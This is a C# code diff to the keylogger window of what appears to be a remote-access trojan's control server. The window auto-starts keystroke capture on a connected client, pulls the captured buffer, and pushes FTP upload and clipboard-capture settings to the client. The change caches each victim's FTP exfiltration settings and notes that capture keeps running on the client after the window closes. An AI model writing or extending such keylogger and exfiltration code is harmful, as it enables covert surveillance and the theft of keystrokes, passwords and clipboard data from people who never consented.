@@ -16,6 +16,9 @@ public partial class KeyloggerWindow : ThemedWindow
     private bool               _capturing;
     private bool               _ftpConfigured;
     private string             _currentFilename = "";
+
+    private static readonly System.Collections.Concurrent.ConcurrentDictionary<string, KeyloggerFtpConfigData>
+        _ftpCache = new();
     private readonly DispatcherTimer _autoRefresh = new() { Interval = TimeSpan.FromSeconds(15) };
 
     public KeyloggerWindow(TlsServer server, string clientId, string clientLabel)
@@ -43,8 +46,8 @@ public partial class KeyloggerWindow : ThemedWindow
             _server.UnregisterHandler(clientId, PacketType.KeyloggerFtpStatus);
             _server.ClientDisconnected -= OnClientDisconnected;
             Lang.LanguageChanged -= ApplyLanguage;
-            ServerWindow.ReportGlobalActivity("Keylogger stopped", _clientId, "complete");
-            ServerWindow.LogGlobal($"[KEYLOG] Keylogger stopped for client {_clientId}.");
+            ServerWindow.ReportGlobalActivity("Keylogger window closed", _clientId, "complete");
+            ServerWindow.LogGlobal($"[KEYLOG] Keylogger window closed for client {_clientId} (still capturing on client).");
         };
 
         // Auto-start capturing on open + immediately fetch live buffer + file list
@@ -52,6 +55,20 @@ public partial class KeyloggerWindow : ThemedWindow
         {
             try
             {
+                // Restore cached FTP settings from a previous window open so the operator
+                // can see what was last applied without having to re-enter credentials.
+                if (_ftpCache.TryGetValue(_clientId, out var cached))
+                {
+                    _ftpConfigured      = true;
+                    TxtFtpHost.Text     = cached.FtpHost;
+                    TxtFtpPort.Text     = cached.FtpPort.ToString();
+                    TxtFtpUser.Text     = cached.FtpUser;
+                    TxtFtpPath.Text     = cached.FtpPath;
+                    TxtMaxSizeKb.Text   = cached.MaxSizeKb.ToString();
+                    ChkClipboard.IsChecked = cached.ClipboardEnabled;
+                    TxtFtpStatus.Text   = string.Format(Lang.Get("KL_FTP_APPLIED"), cached.MaxSizeKb);
+                }
+
                 await Task.Delay(Random.Shared.Next(0, 250));
                 await _server.SendToClient(_clientId, new Packet { Type = PacketType.KeyloggerStart });
                 _capturing = true; UpdateBadge(); _autoRefresh.Start();
@@ -237,6 +254,7 @@ public partial class KeyloggerWindow : ThemedWindow
                 Data = JsonConvert.SerializeObject(cfg)
             });
             _ftpConfigured = true;
+            _ftpCache[_clientId] = cfg;
             TxtFtpStatus.Text = string.Format(Lang.Get("KL_FTP_APPLIED"), maxKb);
         }
         catch (Exception ex)
